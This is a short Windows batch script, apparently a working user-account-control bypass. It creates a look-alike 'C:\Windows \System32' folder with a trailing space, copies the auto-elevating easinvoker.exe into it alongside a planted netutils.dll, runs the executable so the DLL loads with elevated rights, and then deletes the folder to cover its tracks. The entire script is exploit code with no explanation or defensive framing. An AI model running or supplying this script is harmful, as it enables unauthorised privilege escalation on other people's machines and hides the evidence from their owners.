@echo off
cd %USERPROFILE%\Desktop
mkdir "\\?\C:\Windows "
mkdir "\\?\C:\Windows \System32"
copy "c:\windows\system32\easinvoker.exe" "C:\Windows \System32\"
cd c:\temp
copy "netutils.dll" "C:\Windows \System32\"
"C:\Windows \System32\easinvoker.exe"
del /q "C:\Windows \System32\*"
rmdir "C:\Windows \System32\"
rmdir "C:\Windows \"
cd %USERPROFILE%\Desktop